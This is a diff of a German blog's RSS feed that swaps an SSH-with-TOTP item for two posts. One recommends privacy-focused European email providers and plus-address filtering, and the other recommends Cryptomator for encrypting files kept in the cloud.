@@ -1,19 +1,1346 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>MFA on xenophil90.github.io</title>
     <link>https://xenophil90.github.io/tags/mfa/</link>
     <description>Recent content in MFA on xenophil90.github.io</description>
-    <generator>Hugo</generator>
+    <generator>Hugo -- gohugo.io</generator>
     <language>de-de</language>
-    <lastBuildDate>Sun, 12 Jan 2025 09:00:00 +0100</lastBuildDate>
-    <atom:link href="https://xenophil90.github.io/tags/mfa/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 12 Jan 2025 09:00:00 +0100</lastBuildDate><atom:link href="https://xenophil90.github.io/tags/mfa/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>SSH-Zugang mithilfe von Multi-Faktor-Authentifizierung absichern</title>
-      <link>https://xenophil90.github.io/posts/2025/totp-mit-ssh-in-ubuntu-24.04-nutzen/</link>
-      <pubDate>Sun, 12 Jan 2025 09:00:00 +0100</pubDate>
-      <guid>https://xenophil90.github.io/posts/2025/totp-mit-ssh-in-ubuntu-24.04-nutzen/</guid>
-      <description>&lt;h2 id=&#34;fernzugriff-mithilfe-von-ssh&#34;&gt;&#xA;    &lt;a href=&#34;#fernzugriff-mithilfe-von-ssh&#34; class=&#34;anchor&#34;&gt;&#xA;        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;&#xA;            &lt;path fill-rule=&#34;evenodd&#34;&#xA;                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;&#xA;            &lt;/path&gt;&#xA;        &lt;/svg&gt;&#xA;    &lt;/a&gt;&#xA;    Fernzugriff mithilfe von SSH&#xA;&lt;/h2&gt;&#xA;&lt;p&gt;SSH (Secure Shell) ist ein Protokoll, das eine verschlüsselte Kommunikation zwischen zwei Geräten ermöglicht. Es wird häufig verwendet, um entfernte Server sicher zu administrieren oder Dateien zu übertragen&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;</description>
+    <title>Die Wahl des richtigen E-Mail-Anbieters: Datenschutz und Sicherheit im digitalen Alltag</title>
+    <link>https://xenophil90.github.io/posts/2025/die-wahl-des-richtigen-e-mail-anbieters-datenschutz-und-sicherheit-im-digitalen-alltag/</link>
+    <pubDate>Sun, 23 Feb 2025 09:00:00 +0100</pubDate>
+    <author>Phil Krämer</author>
+    <guid>https://xenophil90.github.io/posts/2025/die-wahl-des-richtigen-e-mail-anbieters-datenschutz-und-sicherheit-im-digitalen-alltag/</guid>
+    <description>
+        &lt;h2 id=&#34;einleitung&#34;&gt;
+    &lt;a href=&#34;#einleitung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Einleitung
+&lt;/h2&gt;
+&lt;p&gt;E-Mail-Kommunikation ist ein essenzieller Bestandteil unseres digitalen Lebens. Dennoch wird die Bedeutung der Wahl des richtigen E-Mail-Anbieters oft unterschätzt. Besonders in Zeiten, in denen das Vertrauen in große, insbesondere US-amerikanische Anbieter schwindet, rückt das Thema Datenschutz und Sicherheit wieder stärker in den Fokus.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/E-Mail-Security.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;warum-ist-die-wahl-des-e-mail-anbieters-so-wichtig&#34;&gt;
+    &lt;a href=&#34;#warum-ist-die-wahl-des-e-mail-anbieters-so-wichtig&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Warum ist die Wahl des E-Mail-Anbieters so wichtig?
+&lt;/h2&gt;
+&lt;p&gt;Viele bekannte Anbieter, die kostenlose E-Mail-Dienste anbieten, finanzieren sich möglicherweise durch die Analyse und Verwertung der Nutzerdaten&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;. Nach dem Motto „Wenn der Service kostenlos ist, bist du die Ware“ werden E-Mail-Inhalte eventuell systematisch ausgewertet. Dies ist nicht nur eine Frage der Privatsphäre, sondern auch der Sicherheit. Schließlich enthalten E-Mail-Konten oft hochsensible Daten wie Korrespondenz mit Steuerberatern, Anwälten oder Ärzten.&lt;/p&gt;
+&lt;p&gt;Darüber hinaus dient die eigene E-Mail-Adresse häufig als Schlüssel für andere digitale Dienste. Mit der „Passwort vergessen“-Funktion können Angreifer durch den Zugriff auf ein kompromittiertes E-Mail-Konto auch andere Accounts übernehmen. Identitätsdiebstahl, Erpressung oder unbefugte Kontozugriffe sind dann oft nur noch eine Frage der Zeit.&lt;/p&gt;
+&lt;h2 id=&#34;europäische-alternativen-sicherheit-gegen-eine-kleine-gebühr&#34;&gt;
+    &lt;a href=&#34;#europ%c3%a4ische-alternativen-sicherheit-gegen-eine-kleine-geb%c3%bchr&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Europäische Alternativen: Sicherheit gegen eine kleine Gebühr
+&lt;/h2&gt;
+&lt;p&gt;Es gibt jedoch Alternativen zu den großen E-Mail-Anbietern, die mehr Datenschutz bieten und sich nicht durch Werbung oder Datenanalyse finanzieren. Europäische Anbieter wie &lt;strong&gt;Mailbox.org&lt;/strong&gt;&lt;sup id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;4&lt;/a&gt;&lt;/sup&gt; und &lt;strong&gt;Posteo&lt;/strong&gt;&lt;sup id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;5&lt;/a&gt;&lt;/sup&gt; setzen auf Sicherheit und Datenschutzfreundlichkeit. Der Unterschied zu den „kostenlosen“ Anbietern: Statt mit persönlichen Daten bezahlt man mit Geld – ein kleiner Preis für eine größere Kontrolle über die eigenen Daten.&lt;/p&gt;
+&lt;p&gt;Beide Anbieter bieten eine verschlüsselte E-Mail-Kommunikation und -Speicherung sowie Schutz vor Tracking. Insbesondere Posteo ermöglicht es, neben E-Mails auch Kalender- und Kontaktdaten verschlüsselt zu speichern – und das auf eine Weise, die für den normalen Nutzer unsichtbar bleibt.&lt;/p&gt;
+&lt;h2 id=&#34;praktische-funktionen-für-mehr-kontrolle&#34;&gt;
+    &lt;a href=&#34;#praktische-funktionen-f%c3%bcr-mehr-kontrolle&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Praktische Funktionen für mehr Kontrolle
+&lt;/h2&gt;
+&lt;p&gt;Ein besonders nützliches Feature bei Posteo sind die sogenannten &lt;strong&gt;Filter-Adressen&lt;/strong&gt;. Dabei handelt es sich um eine einfache, aber effektive Möglichkeit, Spam zu minimieren und die eigene E-Mail-Adresse vor Datenhändlern zu schützen. Die Funktionsweise ist simpel:&lt;/p&gt;
+&lt;p&gt;Zusätzlich zur Hauptadresse (z. B. &lt;a href=&#34;mailto:max.mustermann@posteo.de&#34;&gt;max.mustermann@posteo.de&lt;/a&gt;) können Filter-Adressen mit einem Plus-Zeichen und einer beliebigen Zeichenfolge erstellt werden, z. B. &lt;strong&gt;&lt;a href=&#34;mailto:max.mustermann&amp;#43;newsletter@posteo.de&#34;&gt;max.mustermann+newsletter@posteo.de&lt;/a&gt;&lt;/strong&gt;. Dies ermöglicht eine gezielte Organisation der E-Mails, indem Nachrichten für bestimmte Dienste automatisch in eigene Ordner verschoben werden.&lt;/p&gt;
+&lt;p&gt;Darüber hinaus bieten Filter-Adressen einen weiteren Vorteil: Wenn plötzlich Spam an eine bestimmte Adresse (z. B. &lt;a href=&#34;mailto:max.mustermann&amp;#43;webshop@posteo.de&#34;&gt;max.mustermann+webshop@posteo.de&lt;/a&gt;) gesendet wird, lässt sich leicht erkennen, welcher Anbieter die E-Mail-Adresse weitergegeben oder durch eine Sicherheitslücke verloren hat. Dadurch können Nutzer gezielt Maßnahmen ergreifen, etwa durch das Training des Spam-Filters oder die Kontaktaufnahme mit dem betroffenen Unternehmen.&lt;/p&gt;
+&lt;h2 id=&#34;fazit&#34;&gt;
+    &lt;a href=&#34;#fazit&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Fazit
+&lt;/h2&gt;
+&lt;p&gt;Die Wahl des E-Mail-Anbieters sollte nicht leichtfertig getroffen werden. Wer Wert auf Datenschutz und Sicherheit legt, sollte sich bewusst für einen Anbieter entscheiden, der diese Aspekte ernst nimmt. Europäische Anbieter wie Posteo und Mailbox.org bieten eine sichere und datenschutzfreundliche Alternative zu den großen US-amerikanischen Plattformen – und das zu einem fairen Preis. Mit zusätzlichen Funktionen wie Filter-Adressen lassen sich nicht nur Spam reduzieren, sondern auch potenzielle Sicherheitsrisiken frühzeitig erkennen und eindämmen.&lt;/p&gt;
+&lt;p&gt;Ein bewusster Umgang mit digitalen Diensten ist eine wichtige Form der Selbstverteidigung in der vernetzten Welt. Ein Wechsel zu einem sicheren E-Mail-Anbieter ist ein erster, aber essenzieller Schritt in Richtung eines datenschutzfreundlicheren digitalen Alltags.&lt;/p&gt;
+&lt;p&gt;Wer sich darüber hinaus informieren möchte, welche europäischen Alternativen zu den großen US-amerikanischen E-Mail-Anbietern es gibt, dem lege ich diese Übersicht&lt;sup id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;6&lt;/a&gt;&lt;/sup&gt; ans Herz.&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.computerwoche.de/article/2823977/gmail-integriert-ki-in-seine-mobile-app.html&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://www.computerwoche.de/article/2823977/gmail-integriert-ki-in-seine-mobile-app.html&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://tuta.com/de/blog/gmail-trained-bard&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://tuta.com/de/blog/gmail-trained-bard&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://dr-dsgvo.de/google-transparenzbericht-google-gibt-verarbeitung-von-nutzerdaten-durch-geheimdienste-zu/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://dr-dsgvo.de/google-transparenzbericht-google-gibt-verarbeitung-von-nutzerdaten-durch-geheimdienste-zu/&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:4&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://mailbox.org/de/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://mailbox.org/de/&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:4&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:5&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://posteo.de/de&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://posteo.de/de&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:5&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:6&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://european-alternatives.eu/category/email-providers&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://european-alternatives.eu/category/email-providers&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:6&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+    </description>
     </item>
+    
+    <item>
+    <title>Dein digitaler Tresor: Warum du in der Cloud verschlüsseln solltest</title>
+    <link>https://xenophil90.github.io/posts/2025/dein-digitaler-tresor-warum-du-in-der-cloud-verschl%C3%BCsseln-solltest/</link>
+    <pubDate>Sun, 16 Feb 2025 09:00:00 +0100</pubDate>
+    <author>Phil Krämer</author>
+    <guid>https://xenophil90.github.io/posts/2025/dein-digitaler-tresor-warum-du-in-der-cloud-verschl%C3%BCsseln-solltest/</guid>
+    <description>
+        &lt;h2 id=&#34;einleitung&#34;&gt;
+    &lt;a href=&#34;#einleitung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Einleitung
+&lt;/h2&gt;
+&lt;p&gt;In letzter Zeit werde ich immer häufiger von Freunden, Bekannten und Familienmitgliedern gefragt, welche Konsequenzen die aktuelle (geo)politische Lage für die Sicherheit ihrer persönlichen Daten hat. Anstatt auf die spezifischen Ereignisse der letzten Wochen und Monate einzugehen, wiederhole ich meistens, was ich seit Jahren sage: Wenn es um die Sicherheit der persönlichen Daten geht, sollte man diese grundsätzlich &lt;strong&gt;verschlüsselt&lt;/strong&gt; bei Cloud-Anbietern speichern.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/KI-Lock.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;kein-vertrauen-in-die-anbieter&#34;&gt;
+    &lt;a href=&#34;#kein-vertrauen-in-die-anbieter&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Kein Vertrauen in die Anbieter
+&lt;/h2&gt;
+&lt;p&gt;Viele Menschen in meinem Umfeld nutzen Cloud-Dienste, um persönliche Daten wie Steuerbescheide, Urkunden, Krankenhausberichte, Kreditverträge und Ähnliches abzulegen. Meistens sind es US-amerikanische Anbieter – aber letztlich spielt die Herkunft kaum eine Rolle. Ich vertraue keinem Storage-Cloud-Anbieter so sehr, dass ich ihm meine persönlichen Daten im Klartext anvertrauen würde – egal, wo er sitzt.&lt;/p&gt;
+&lt;p&gt;Die Bedrohungslage hat sich durch die aktuellen Entwicklungen rund um Künstliche Intelligenz (KI) noch einmal verändert – wenngleich nicht wesentlich. Die wenigsten Personen werden möchte, dass ihre Daten zum Training von LLMs oder für andere undurchsichtige Zwecke verwendet werden. Auch früher gab es schon immer Diskussionen darüber, ob z. B. Google Cloud-Daten nutzt, um personalisierte Werbung zu schalten oder Persönlichkeitsprofile zu erstellen – daher hat sich die Diskussion selbst kaum verändert. Damals wie heute lautet die Antwort: Sind die Daten ordentlich verschlüsselt und kann der Anbieter nicht darauf zugreifen, so sind sie auch für unerwünschte Zwecke unbrauchbar.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Doch wie kann man heutzutage eine gute Verschlüsselung auf Datei-Ebene in der Cloud umsetzen?&lt;/strong&gt; Viele Lösungen sind unpraktisch – etwa verschlüsselte ZIP-Dateien, die nach jeder Änderung komplett herunter- und wieder hochgeladen werden müssen.&lt;/p&gt;
+&lt;h2 id=&#34;was-ist-cryptomator&#34;&gt;
+    &lt;a href=&#34;#was-ist-cryptomator&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Was ist Cryptomator?
+&lt;/h2&gt;
+&lt;p&gt;Cryptomator&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; ist ein kostenloses Open-Source-Programm, das eure Dateien verschlüsselt, bevor sie in der Cloud gespeichert werden. Das bedeutet: Niemand – weder Hacker noch der Cloud-Anbieter – kann auf eure Daten zugreifen, selbst wenn sie in Diensten wie Google Drive, Dropbox oder OneDrive liegen.&lt;/p&gt;
+&lt;p&gt;Die Software funktioniert wie ein virtueller Tresor: Ihr legt eure sensiblen Dateien in einen speziellen Ordner („Tresor“), und Cryptomator verschlüsselt sie automatisch, bevor sie in der Cloud abgelegt werden. Nur mit eurem Passwort könnt ihr die Dateien wieder entschlüsseln und öffnen.&lt;/p&gt;
+&lt;h3 id=&#34;die-vorteile-von-cryptomator-auf-einen-blick&#34;&gt;
+    &lt;a href=&#34;#die-vorteile-von-cryptomator-auf-einen-blick&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Die Vorteile von Cryptomator auf einen Blick
+&lt;/h3&gt;
+&lt;p&gt;Hier sind die Vorteile der Lösung auf einen Blick:&lt;/p&gt;
+&lt;ul style=&#34;list-style:none;&#34;&gt;
+&lt;li&gt;✅ &lt;strong&gt;Einfache Bedienung:&lt;/strong&gt; Keine komplizierten Einstellungen nötig.&lt;/li&gt;
+&lt;li&gt;✅ &lt;strong&gt;Maximale Sicherheit:&lt;/strong&gt; Starke Ende-zu-Ende-Verschlüsselung schützt eure Daten.&lt;/li&gt;
+&lt;li&gt;✅ &lt;strong&gt;Transparenz durch Open Source:&lt;/strong&gt; Der öffentlich einsehbare Code schafft zusätzliches Vertrauen.&lt;/li&gt;
+&lt;li&gt;✅ &lt;strong&gt;Plattformunabhängig:&lt;/strong&gt; Funktioniert auf Windows, macOS, Linux, Android und iOS.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Kurz gesagt: Mit Cryptomator bleiben eure in der Cloud gespeicherten Daten wirklich privat – einfach, sicher und kostenlos.&lt;/p&gt;
+&lt;p&gt;Wer auf eine andere Lösung setzen möchte, kann sich auch gerne Veracrypt&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; anschauen – hier wird die Verschlüsselung aber pro Container und nicht pro Datei durchgeführt und ist damit unpraktischer für die Verwendung mit Cloud-Diensten.&lt;/p&gt;
+&lt;p&gt;Wer sich darüber hinaus informieren möchte, welche europäischen Alternativen zu den großen US-amerikanischen Cloud-Anbietern es gibt, dem lege ich diese Übersicht&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt; ans Herz.&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://cryptomator.org&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://cryptomator.org&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
